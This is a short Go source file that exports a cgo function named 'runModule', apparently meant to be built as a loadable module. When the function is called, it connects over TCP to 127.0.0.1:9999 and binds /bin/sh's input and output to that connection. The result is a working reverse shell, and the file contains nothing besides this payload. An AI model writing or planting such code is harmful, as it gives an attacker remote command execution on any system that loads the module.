package main

import (
	"C"
	"net"
	"os/exec"
)

//export runModule
func runModule() {
	conn, err := net.Dial("tcp", "127.0.0.1:9999")
	if (err != nil) {
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin=conn
	cmd.Stdout=conn
	cmd.Stderr=conn
	cmd.Run()
}

func main() {}
